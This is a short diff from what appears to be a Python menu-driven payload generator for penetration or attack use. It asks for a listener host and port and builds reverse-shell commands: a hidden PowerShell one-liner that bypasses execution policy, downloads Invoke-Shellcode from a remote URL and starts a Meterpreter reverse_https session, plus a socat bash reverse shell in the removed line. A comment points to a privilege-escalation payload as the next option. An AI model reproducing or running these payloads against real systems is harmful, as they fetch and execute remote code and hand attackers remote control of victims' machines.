@@ -139,7 +139,7 @@ Input Payload ID(Single Digit) or 'Q' to quit this menu.
                 # TODO:/ doesn't work yet
                 LHOST = raw_input("Please provide an LHOST for the Reverse Connection handler: ")
                 LPORT = raw_input("Please provide an LPORT for the Reverse Connection handler: ")
-                payload = "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost {0} -Lport {1} -Force".payload = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{0}:{1}".format(LHOST, LPORT)
+                payload = "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost {0} -Lport {1} -Force".format(LHOST, LPORT)
                 print ("[+] Done. Reverse HTTP Meterpreter selected.")
             elif choice == '2':
                 # Retrieve and execute PowerShell script aimed at privilege escalation
